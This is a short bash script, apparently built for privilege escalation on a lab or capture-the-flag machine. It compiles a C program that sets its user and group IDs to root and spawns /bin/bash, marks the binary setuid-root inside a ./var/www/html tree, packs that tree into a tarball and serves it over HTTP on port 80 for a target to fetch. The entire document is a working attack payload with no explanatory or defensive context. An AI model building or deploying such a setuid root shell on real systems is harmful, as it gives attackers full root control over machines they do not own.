#!/bin/bash

# create a c file that will run a shell as root
echo """#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system(\"/bin/bash\");
    return 0;
}""" > ./a.c

# mkidr a directory to put the file in
mkdir -p ./var/www/html

# compile the c file
gcc -static -m32 -o ./var/www/html/a ./a.c

# change the owner of the directory to root
sudo chown root:root -R ./var

# make the file suid
sudo chmod u+s ./var/www/html/a

# tar the directory
tar -zcvf a.tar.gz ./var

# start a web server
sudo python3 -m http.server 80
